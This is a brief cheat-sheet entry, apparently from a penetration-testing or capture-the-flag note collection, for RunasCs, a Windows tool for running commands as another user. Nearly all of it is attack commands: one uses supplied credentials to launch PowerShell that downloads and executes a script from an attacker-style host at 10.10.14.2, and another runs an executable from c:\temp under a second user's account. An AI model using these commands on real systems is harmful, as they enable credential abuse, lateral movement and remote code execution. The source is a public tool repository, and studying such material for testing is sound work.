# Name
RunasCs

## Usage
```
# No space in password
.\RunasCs.exe jamie P@ssw0rd123! "powershell.exe -c iex (new-object net.webclient).downloadstring('http://10.10.14.2/runall.ps1')" -d zsm.local -l 8

# When space is present in password
.\RunasCs.exe pgibbons "I l0ve going Fishing!" "cmd /c c:\temp\m445.exe" -d corp.local -l 8
```

## Source
https://github.com/antonioCoco/RunasCs
